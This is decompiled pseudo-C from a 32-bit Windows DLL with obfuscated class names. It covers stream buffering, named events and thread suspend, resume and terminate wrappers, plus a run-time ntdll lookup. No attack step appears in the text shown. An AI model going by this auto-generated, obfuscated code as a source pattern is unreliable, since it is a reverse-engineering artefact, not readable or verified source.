//----- (1000E72D) --------------------------------------------------------
int __stdcall sub_1000E72D(int a1, int a2, int a3)
{
  int *v3; // eax
  int *v4; // eax
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]
  void *v8; // [esp+3Ch] [ebp+Ch]

  sub_10025A41(a1, a2, 1);
  v7 = 0;
  *(_DWORD *)a1 = &off_10073550;
  sub_1000C28D(0, a1 + 16, 0);
  sub_1000C28D(0, a1 + 40, 0);
  sub_1000C28D(0, a1 + 60, 0);
  *(_DWORD *)(a1 + 80) = a3;
  sub_1000C28D((void *)1, a1 + 84, 0);
  LOBYTE(v7) = 4;
  *(_BYTE *)(a1 + 104) = 0;
  v8 = (void *)sub_1000EB85((_DWORD **)a1, 0x1000u);
  v3 = (int *)sub_1000C28D(v8, (int)v6, 0);
  LOBYTE(v7) = 5;
  sub_1000C439(v3, a1 + 16);
  LOBYTE(v7) = 4;
  sub_1000C45D(v6);
  *(_DWORD *)(a1 + 36) = 0;
  v4 = (int *)sub_1000C28D(v8, (int)v6, 0);
  LOBYTE(v7) = 6;
  sub_1000C439(v4, a1 + 40);
  LOBYTE(v7) = 4;
  sub_1000C45D(v6);
  return a1;
}
// 10073550: using guessed type int (__thiscall *off_10073550)(void *Block, char);
// 1000E72D: using guessed type int var_20[7];

//----- (1000E804) --------------------------------------------------------
void *__thiscall sub_1000E804(void *Block, char a2)
{
  sub_1000E823((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E823) --------------------------------------------------------
void __thiscall sub_1000E823(int this)
{
  *(_DWORD *)this = &off_10073550;
  sub_10025AE7((_BYTE *)this);
  sub_1000C45D((int *)(this + 84));
  sub_1000C45D((int *)(this + 60));
  sub_1000C45D((int *)(this + 40));
  sub_1000C45D((int *)(this + 16));
  sub_10025A99((_BYTE *)this);
}
// 10073550: using guessed type int (__thiscall *off_10073550)(void *Block, char);

//----- (1000E89F) --------------------------------------------------------
int __thiscall sub_1000E89F(void *this, _BYTE *a2)
{
  int v2; // esi
  int v3; // edi

  v2 = (int)this + 84;
  v3 = (*(int (__stdcall **)(int))(*(_DWORD *)this + 12))((int)this + 84);
  if ( v3 )
    *a2 = *(_BYTE *)sub_1000C55B(v2, 0);
  return v3;
}

//----- (1000E8CB) --------------------------------------------------------
int __thiscall sub_1000E8CB(int this, int a2)
{
  _DWORD **v2; // esi
  _DWORD *v3; // eax
  _DWORD **v4; // ecx
  int *v5; // edi
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int *v9; // eax
  int *v10; // edi
  int v11; // ebx
  _DWORD *v12; // esi
  int v13; // eax
  _DWORD **v14; // edi
  void *v15; // eax
  _DWORD *v16; // eax
  const void *v18; // [esp-8h] [ebp-48h]
  size_t v19; // [esp-4h] [ebp-44h]
  int v20[5]; // [esp+10h] [ebp-30h] BYREF
  int pExceptionObject; // [esp+24h] [ebp-1Ch] BYREF
  _DWORD **v22; // [esp+28h] [ebp-18h]
  int v23; // [esp+2Ch] [ebp-14h]
  _DWORD **v24; // [esp+30h] [ebp-10h]
  int v25; // [esp+3Ch] [ebp-4h]

  v2 = (_DWORD **)this;
  v24 = (_DWORD **)this;
  if ( !*(_BYTE *)(this + 104) )
  {
    sub_1000ECA7((_DWORD **)this);
    *((_BYTE *)v2 + 104) = 1;
  }
  if ( v2[18] )
  {
    v3 = *v2;
    v4 = v2;
    return ((int (__thiscall *)(_DWORD **, int))v3[15])(v4, a2);
  }
  if ( (unsigned int)v2[9] >= (*(int (__thiscall **)(_DWORD *))(*v2[20] + 16))(v2[20]) )
  {
LABEL_13:
    v23 = ((int (__thiscall *)(_DWORD **, _DWORD *))(*v2)[14])(v2, v2[9]);
    v9 = (int *)sub_1000C73C(v23, (int *)v2 + 10, (int)v20, 0);
    v25 = 1;
    v10 = (int *)v24;
    v22 = v24 + 15;
    sub_1000C439(v9, (int)(v24 + 15));
    v25 = -1;
    sub_1000C45D(v20);
    v11 = v23;
    v12 = v10 + 4;
    v13 = sub_1000C709(v23, v10 + 4, (int)v20, 0);
    v25 = 2;
    v14 = v24;
    (*(void (__thiscall **)(_DWORD *, int, _DWORD **))(*v24[20] + 12))(v24[20], v13, v22);
    v25 = -1;
    sub_1000C45D(v20);
    v19 = (size_t)v14[9] - v11;
    v18 = (const void *)(v11 + sub_1000C52E(v12));
    v15 = (void *)sub_1000C50A(v12);
    memcpy_0(v15, v18, v19);
    v16 = v14[5];
    v14[9] = (_DWORD *)((char *)v14[9] - v11);
    *((_BYTE *)v16 + 8) = 1;
    v3 = *v14;
    v4 = v14;
    return ((int (__thiscall *)(_DWORD **, int))v3[15])(v4, a2);
  }
  v5 = (int *)(v2 + 4);
  while ( 1 )
  {
    v6 = ((int (__thiscall *)(_DWORD **, _DWORD))(*v2)[13])(v2, *(_DWORD *)(a2 + 12));
    if ( v6 >= (unsigned int)v2[7] )
      v6 = (unsigned int)v2[7];
    if ( !v6 )
      v6 = (*(int (__thiscall **)(_DWORD *))(*v2[20] + 16))(v2[20]);
    sub_1000C73C(v6 - (_DWORD)v2[9], v5, (int)v20, (int)v2[9]);
    v25 = 0;
    v2 = v24;
    v7 = ((int (__thiscall *)(_DWORD **))(*v24)[11])(v24);
    v8 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, v20);
    if ( !v8 )
      break;
    v2[9] = (_DWORD *)((char *)v2[9] + v8);
    v25 = -1;
    sub_1000C45D(v20);
    if ( (unsigned int)v2[9] >= (*(int (__thiscall **)(_DWORD *))(*v2[20] + 16))(v2[20]) )
      goto LABEL_13;
  }
  if ( v2[9] )
  {
    sub_1000EA5A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
  }
  v25 = -1;
  sub_1000C45D(v20);
  return 0;
}
// 1000E8CB: using guessed type int var_30[5];

//----- (1000EA5A) --------------------------------------------------------
_DWORD *__stdcall sub_1000EA5A(_DWORD *a1)
{
  *a1 = &unk_10073544;
  sub_1000DEEF(a1 + 1);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073360;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_1007353C;
  return a1;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);
// 1007353C: using guessed type int (__stdcall *off_1007353C)(char);

//----- (1000EAAE) --------------------------------------------------------
void __thiscall sub_1000EAAE(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1000EB5C((int)(this + 1));
  sub_1000DF1A(v1);
}

//----- (1000EAC0) --------------------------------------------------------
_DWORD *__thiscall sub_1000EAC0(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10073544;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 1, v4);
  }
  sub_1000CC4F(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_1007353C;
  return this;
}
// 1007353C: using guessed type int (__stdcall *off_1007353C)(char);

//----- (1000EB2F) --------------------------------------------------------
_DWORD *__thiscall sub_1000EB2F(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_1000EB5C((int)this);
  sub_1000DF1A(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000EB5C) --------------------------------------------------------
int __stdcall sub_1000EB5C(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 4) + a1 - 4) = &off_10073360;
  return result;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);

//----- (1000EB85) --------------------------------------------------------
int __thiscall sub_1000EB85(_DWORD **this, unsigned int a2)
{
  unsigned int v3; // ebx

  v3 = a2 % (*(int (__thiscall **)(_DWORD *))(*this[20] + 16))(this[20]);
  if ( v3 )
    return a2 - v3 + (*(int (__thiscall **)(_DWORD *))(*this[20] + 16))(this[20]);
  else
    return a2;
}

//----- (1000EBBD) --------------------------------------------------------
int __thiscall sub_1000EBBD(_DWORD **this, unsigned int a2)
{
  return a2 - a2 % (*(int (__thiscall **)(_DWORD *))(*this[20] + 16))(this[20]);
}

//----- (1000EBDA) --------------------------------------------------------
size_t __thiscall sub_1000EBDA(int *this, _DWORD *a2)
{
  size_t v4; // ecx
  void *v5; // eax
  int *v6; // eax
  const void *v8; // [esp-8h] [ebp-3Ch]
  int v9[5]; // [esp+10h] [ebp-24h] BYREF
  size_t Size; // [esp+24h] [ebp-10h]
  int v11; // [esp+30h] [ebp-4h]
  char v12; // [esp+3Fh] [ebp+Bh]

  v4 = this[18];
  Size = a2[3];
  if ( Size >= v4 )
    Size = v4;
  v12 = *(_BYTE *)(a2[1] + 8);
  v8 = (const void *)sub_1000C52E(this + 15);
  v5 = (void *)sub_1000C50A(a2);
  memcpy(v5, v8, Size);
  if ( v12 )
    *(_BYTE *)(a2[1] + 8) = 1;
  v6 = (int *)sub_1000C73C(this[18] - Size, this + 15, (int)v9, Size);
  v11 = 0;
  sub_1000C439(v6, (int)(this + 15));
  v11 = -1;
  sub_1000C45D(v9);
  return Size;
}
// 1000EBDA: using guessed type int var_24[5];

//----- (1000EC65) --------------------------------------------------------
int __thiscall sub_1000EC65(_DWORD *this)
{
  int v2; // eax
  int v3; // ebx
  int v4; // edi
  int v5; // eax

  v2 = (*(int (__thiscall **)(_DWORD *))(*this + 44))(this);
  v3 = this[18];
  v4 = *this;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 24))(v2);
  return v3 + (*(int (__thiscall **)(_DWORD *, int))(v4 + 56))(this, this[9] + v5);
}

//----- (1000EC8A) --------------------------------------------------------
BOOL __thiscall sub_1000EC8A(_DWORD *this)
{
  int v1; // eax
  BOOL result; // eax

  result = 0;
  if ( !this[18] )
  {
    v1 = (*(int (__thiscall **)(_DWORD *))(*this + 44))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1 + 28))(v1) )
      return 1;
  }
  return result;
}

//----- (1000ECA7) --------------------------------------------------------
LONG __usercall sub_1000ECA7@<eax>(_DWORD **a1@<esi>)
{
  void *v1; // ebx
  int v2; // eax
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  v1 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1[20] + 24))(a1[20]);
  sub_1000C28D(v1, (int)v4, 0);
  v5 = 0;
  v2 = ((int (__thiscall *)(_DWORD **))(*a1)[11])(a1);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v2 + 20))(v2, v4);
  (*(void (__thiscall **)(_DWORD *, int *))(*a1[20] + 4))(a1[20], v4);
  v5 = -1;
  return sub_1000C45D(v4);
}
// 1000ECA7: using guessed type int var_20[7];

//----- (1000ECFC) --------------------------------------------------------
char sub_1000ECFC()
{
  return 0;
}

//----- (1000ED1A) --------------------------------------------------------
int __stdcall sub_1000ED1A(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  volatile LONG *v5; // [esp-8h] [ebp-2Ch] BYREF
  size_t v6; // [esp-4h] [ebp-28h]
  volatile LONG **v7; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  v9 = 0;
  sub_10025BDE(a1);
  v6 = 40;
  *(_DWORD *)a1 = &off_10073590;
  Block = operator new(v6);
  LOBYTE(v9) = 2;
  if ( Block )
  {
    v5 = (volatile LONG *)v6;
    v7 = &v5;
    sub_10018B3B(&v5);
    LOBYTE(v9) = 2;
    v3 = sub_10017C15(-1, 0x80000000, Block, (int)&a2, 128, -1, (int)v5, (volatile LONG *)v6);
  }
  else
  {
    v3 = 0;
  }
  LOBYTE(v9) = 1;
  sub_10004726((_DWORD *)(a1 + 8), (int)v3);
  LOBYTE(v9) = 4;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  *(_BYTE *)(a1 + 16) = 1;
  v9 = -1;
  sub_10009F65(&a2);
  return a1;
}
// 10073590: using guessed type int (__thiscall *off_10073590)(void *Block, char);

//----- (1000EDB8) --------------------------------------------------------
_BYTE *__thiscall sub_1000EDB8(_BYTE *Block, char a2)
{
  sub_1000EE45(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EDD7) --------------------------------------------------------
int __stdcall sub_1000EDD7(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  sub_10025BDE(a1);
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_10073590;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_1000476A(&a2);
  return a1;
}
// 10073590: using guessed type int (__thiscall *off_10073590)(void *Block, char);

//----- (1000EE45) --------------------------------------------------------
void __thiscall sub_1000EE45(_BYTE *this)
{
  *(_DWORD *)this = &off_10073590;
  sub_1000EF02(this);
  sub_1000476A(this + 8);
  sub_10025C2C(this);
}
// 10073590: using guessed type int (__thiscall *off_10073590)(void *Block, char);

//----- (1000EE9D) --------------------------------------------------------
int __thiscall sub_1000EE9D(_DWORD **this, _BYTE *a2)
{
  __int16 v2; // ax

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 52))(this[2]);
  if ( v2 == -1 )
    return 0;
  *a2 = v2;
  return 1;
}

//----- (1000EEC0) --------------------------------------------------------
int __thiscall sub_1000EEC0(_DWORD **this, int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD *, int))(*this[2] + 48))(this[2], a2);
  return v2 != -1 ? v2 : 0;
}

//----- (1000EEDB) --------------------------------------------------------
int __thiscall sub_1000EEDB(_DWORD **this)
{
  int v2; // edi

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 112))(this[2]);
  return v2 - ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
}

//----- (1000EEF7) --------------------------------------------------------
BOOL __thiscall sub_1000EEF7(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (1000EF02) --------------------------------------------------------
int __thiscall sub_1000EF02(_BYTE *this)
{
  int result; // eax
  bool v3; // zf

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[16] == 0;
    this[4] = 1;
    if ( !v3 )
      return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 2) + 8))(*((_DWORD *)this + 2));
  }
  return result;
}

//----- (1000EF22) --------------------------------------------------------
int __thiscall sub_1000EF22(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 68))(this[2]);
}

//----- (1000EF2A) --------------------------------------------------------
int __thiscall sub_1000EF2A(_DWORD **this, int a2, int a3)
{
  int v3; // edx

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = 1;
    }
    else if ( a3 == 2 )
    {
      v3 = 2;
    }
  }
  return (*(int (__thiscall **)(_DWORD *, int, int))(*this[2] + 64))(this[2], a2, v3);
}

//----- (1000EF54) --------------------------------------------------------
char sub_1000EF54()
{
  return 1;
}

//----- (1000EF5A) --------------------------------------------------------
_BYTE *__thiscall sub_1000EF5A(_DWORD *this, _BYTE *a2, char a3, unsigned __int8 pExceptionObject)
{
  int v5; // eax
  const WCHAR *v6; // eax
  _DWORD *v7; // eax
  HANDLE EventW; // eax
  unsigned __int8 v9; // al
  _DWORD v11[3]; // [esp+10h] [ebp-24h] BYREF
  int v12[2]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-10h]
  int v14; // [esp+30h] [ebp-4h]

  v13 = 0;
  v5 = this[1];
  if ( *(_DWORD *)(v5 + 28) )
  {
    if ( a3 )
    {
      v7 = sub_1000F0FB(v12, (int)this);
      v14 = 0;
      v5 = v7[1];
      v13 = 1;
    }
    v6 = *(const WCHAR **)(v5 + 12);
  }
  else
  {
    v6 = 0;
  }
  EventW = CreateEventW(0, pExceptionObject, 0, v6);
  sub_10014C49(a2, EventW, 0);
  v14 = 2;
  if ( (v13 & 1) != 0 )
  {
    v13 &= ~1u;
    sub_10009F65(v12);
  }
  v9 = pExceptionObject;
  *(_DWORD *)a2 = &off_100735C0;
  a2[8] = v9;
  if ( a3 && !*(_DWORD *)(this[1] + 28) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( !*(_DWORD *)(*((_DWORD *)a2 + 1) + 16) )
  {
    sub_1000E2E3(v11, 1);
    _CxxThrowException(v11, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a2;
}
// 100735C0: using guessed type int (__thiscall *off_100735C0)(void *Block, char);
// 1000EF5A: using guessed type _DWORD var_24[3];

//----- (1000F027) --------------------------------------------------------
void __thiscall sub_1000F027(int *this)
{
  *this = (int)&off_100735C0;
  sub_10014C9D(this);
}
// 100735C0: using guessed type int (__thiscall *off_100735C0)(void *Block, char);

//----- (1000F04B) --------------------------------------------------------
int *__stdcall sub_1000F04B(int *a1, int a2)
{
  sub_10014C49(a1, (void *)0xFFFFFFFF, 0);
  *a1 = (int)&off_100735C0;
  sub_1000F1C5(a2, a1);
  return a1;
}
// 100735C0: using guessed type int (__thiscall *off_100735C0)(void *Block, char);

//----- (1000F084) --------------------------------------------------------
char __cdecl sub_1000F084(int a1)
{
  const WCHAR *v1; // ebx
  HANDLE v2; // eax
  DWORD v4; // [esp-8h] [ebp-38h]
  DWORD CurrentProcessId; // [esp-4h] [ebp-34h]
  int v6[2]; // [esp+10h] [ebp-20h] BYREF
  _DWORD v7[5]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v7[2] = 0;
  sub_10009F32(v6, a1);
  v8 = 2;
  v1 = *(const WCHAR **)(v6[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  v2 = OpenEventW(0x1F0003u, 0, v1);
  sub_10025D50((int)v7, v2, 0, 0, v4, CurrentProcessId);
  LOBYTE(v1) = v7[1] != 0;
  LOBYTE(v8) = 2;
  sub_1000F1E1(v7);
  v8 = -1;
  sub_10009F65(v6);
  return (char)v1;
}

//----- (1000F0FB) --------------------------------------------------------
_DWORD *__cdecl sub_1000F0FB(_DWORD *a1, int a2)
{
  wchar_t *v2; // eax
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = (wchar_t *)sub_1000BE16((int)&unk_1008F74C);
  v3 = sub_10009D2C(v5, v2);
  v7 = 1;
  sub_1000A132(a1, (int)v3, a2);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_10009F65(v5);
  return a1;
}

//----- (1000F14D) --------------------------------------------------------
BOOL __thiscall sub_1000F14D(_DWORD *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = SetEvent(*(HANDLE *)(this[1] + 16));
  if ( !result )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1000F14D: using guessed type _DWORD pExceptionObject[3];

//----- (1000F17D) --------------------------------------------------------
BOOL __thiscall sub_1000F17D(int this)
{
  BOOL result; // eax
  _DWORD v2[3]; // [esp+0h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  if ( !*(_BYTE *)(this + 8) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  result = ResetEvent(*(HANDLE *)(*(_DWORD *)(this + 4) + 16));
  if ( !result )
  {
    sub_1000E2E3(v2, 1);
    _CxxThrowException(v2, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1000F17D: using guessed type _DWORD var_10[3];

//----- (1000F1C5) --------------------------------------------------------
int *__usercall sub_1000F1C5@<eax>(int a1@<eax>, int *a2@<esi>)
{
  int v2; // edx

  v2 = *a2;
  *((_BYTE *)a2 + 8) = *(_BYTE *)(a1 + 8);
  (*(void (__thiscall **)(int *, _DWORD, int))(v2 + 12))(a2, *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16), 1);
  return a2;
}

//----- (1000F1E1) --------------------------------------------------------
bool __thiscall sub_1000F1E1(_DWORD *this)
{
  *this = off_100735BC;
  return sub_1000F231((int)this);
}
// 100735BC: using guessed type int (__thiscall *off_100735BC[2])(void *Block, char);

//----- (1000F212) --------------------------------------------------------
_DWORD *__thiscall sub_1000F212(_DWORD *Block, char a2)
{
  sub_1000F1E1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F231) --------------------------------------------------------
bool __usercall sub_1000F231@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_1000F24B(a1) )
    return 1;
  result = sub_10025D79(a1);
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (1000F24B) --------------------------------------------------------
BOOL __usercall sub_1000F24B@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 != -1 && v1;
}

//----- (1000F25E) --------------------------------------------------------
_DWORD *__stdcall sub_1000F25E(_DWORD *a1, void *a2, char a3)
{
  sub_10014C49(a1, a2, a3);
  a1[2] = -1;
  *a1 = &off_100735E8;
  return a1;
}
// 100735E8: using guessed type int (__thiscall *off_100735E8)(void *Block, char);

//----- (1000F295) --------------------------------------------------------
int *__thiscall sub_1000F295(int *Block, char a2)
{
  sub_10009607(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F2B5) --------------------------------------------------------
_DWORD *__stdcall sub_1000F2B5(_DWORD *a1, void *a2, char a3)
{
  sub_1000F25E(a1, a2, a3);
  *a1 = &off_10073604;
  return a1;
}
// 10073604: using guessed type int (__thiscall *off_10073604)(void *Block, char);

//----- (1000F2E8) --------------------------------------------------------
int *__thiscall sub_1000F2E8(int *Block, char a2)
{
  sub_1000F307(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F307) --------------------------------------------------------
void __thiscall sub_1000F307(int *this)
{
  *this = (int)&off_10073604;
  sub_10009607(this);
}
// 10073604: using guessed type int (__thiscall *off_10073604)(void *Block, char);

//----- (1000F32C) --------------------------------------------------------
DWORD __thiscall sub_1000F32C(_DWORD *this)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-10h] BYREF
  DWORD ExitCode; // [esp+Ch] [ebp-4h] BYREF

  v1 = this[1];
  ExitCode = 0;
  if ( !GetExitCodeThread(*(HANDLE *)(v1 + 16), &ExitCode) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return ExitCode;
}
// 1000F32C: using guessed type _DWORD pExceptionObject[3];

//----- (1000F368) --------------------------------------------------------
char __thiscall sub_1000F368(_DWORD *this, DWORD dwExitCode)
{
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  LOBYTE(v3) = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( (_BYTE)v3 )
  {
    LOBYTE(v3) = sub_10014E39((int)this);
    if ( !(_BYTE)v3 )
    {
      v3 = TerminateThread(*(HANDLE *)(this[1] + 16), dwExitCode);
      if ( !v3 )
      {
        sub_1000E2E3(pExceptionObject, 1);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
      }
    }
  }
  return v3;
}
// 1000F368: using guessed type _DWORD pExceptionObject[3];

//----- (1000F3B5) --------------------------------------------------------
int __stdcall sub_1000F3B5(int a1, void *pExceptionObject)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int result; // eax
  int v6; // [esp-10h] [ebp-34h] BYREF
  int v7; // [esp-Ch] [ebp-30h]
  int v8[10]; // [esp-8h] [ebp-2Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  if ( (dword_10095790 & 1) == 0 )
  {
    dword_10095790 |= 1u;
    v9 = 0;
    v2 = (wchar_t *)sub_1000BE16((int)&unk_1008F6E0);
    v8[0] = v3;
    v8[7] = (int)v8;
    sub_10009D2C(v8, v2);
    LOBYTE(v9) = 1;
    v7 = v4;
    v6 = v4;
    v8[6] = (int)&v6;
    sub_10009D2C(&v6, aNtdllDll);
    LOBYTE(v9) = 0;
    dword_10092408 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_100265E5(v6, v7, v8[0]);
    v9 = -1;
  }
  memset(pExceptionObject, 0, 0x1Cu);
  result = dword_10092408(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 16), 0, pExceptionObject, 28, 0);
  if ( result < 0 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}
// 1000F3E0: variable 'v3' is possibly undefined
// 1000F3F1: variable 'v4' is possibly undefined
// 10092408: using guessed type int (__stdcall *dword_10092408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10095790: using guessed type int dword_10095790;

//----- (1000F462) --------------------------------------------------------
int __thiscall sub_1000F462(_DWORD *this)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+Ch] [ebp-10h]

  if ( !*(_DWORD *)(this[1] + 16) )
    return -1;
  sub_1000F3B5((int)this, pExceptionObject);
  return v3;
}
// 1000F462: using guessed type char pExceptionObject[12];

//----- (1000F485) --------------------------------------------------------
bool __thiscall sub_1000F485(_DWORD *this)
{
  DWORD v1; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  v1 = ResumeThread(*(HANDLE *)(this[1] + 16));
  if ( v1 == -1 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return v1 <= 1;
}
// 1000F485: using guessed type _DWORD pExceptionObject[3];

//----- (1000F4BF) --------------------------------------------------------
_DWORD *__thiscall sub_1000F4BF(void *this, _DWORD *a2, DWORD a3)
{
  char pExceptionObject[8]; // [esp+10h] [ebp-2Ch] BYREF
  DWORD v5; // [esp+18h] [ebp-24h]
  int v6; // [esp+2Ch] [ebp-10h]

  v6 = 0;
  sub_1000F3B5((int)this, pExceptionObject);
  sub_1001EE7C(v5, a2, a3);
  return a2;
}
// 1000F4BF: using guessed type char pExceptionObject[8];

//----- (1000F4FF) --------------------------------------------------------
DWORD __thiscall sub_1000F4FF(_DWORD *this)
{
  DWORD result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = SuspendThread(*(HANDLE *)(this[1] + 16));
  if ( result == -1 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1000F4FF: using guessed type _DWORD pExceptionObject[3];

//----- (1000F530) --------------------------------------------------------
_DWORD *__usercall sub_1000F530@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess)
{
  HANDLE v3; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  pExceptionObject[6] = 0;
  pExceptionObject[3] = 0;
  v3 = OpenThread(dwDesiredAccess, 0, a1);
  if ( !v3 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000F2B5(a2, v3, 0);
  a2[2] = a1;
  return a2;
}

//----- (1000F58B) --------------------------------------------------------
_DWORD *__userpurge sub_1000F58B@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000F5B8(a1, a2);
  *a2 = &off_10073604;
  return a2;
}
// 10073604: using guessed type int (__thiscall *off_10073604)(void *Block, char);

//----- (1000F5B8) --------------------------------------------------------
_DWORD *__userpurge sub_1000F5B8@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000F5EC(a2, a1);
  *a2 = &off_100735E8;
  a2[2] = *(_DWORD *)(a1 + 8);
  return a2;
}
// 100735E8: using guessed type int (__thiscall *off_100735E8)(void *Block, char);

//----- (1000F5EC) --------------------------------------------------------
_DWORD *__stdcall sub_1000F5EC(_DWORD *a1, int a2)
{
  *a1 = &off_100735D8;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_1000F6F0(a1 + 1);
  return a1;
}
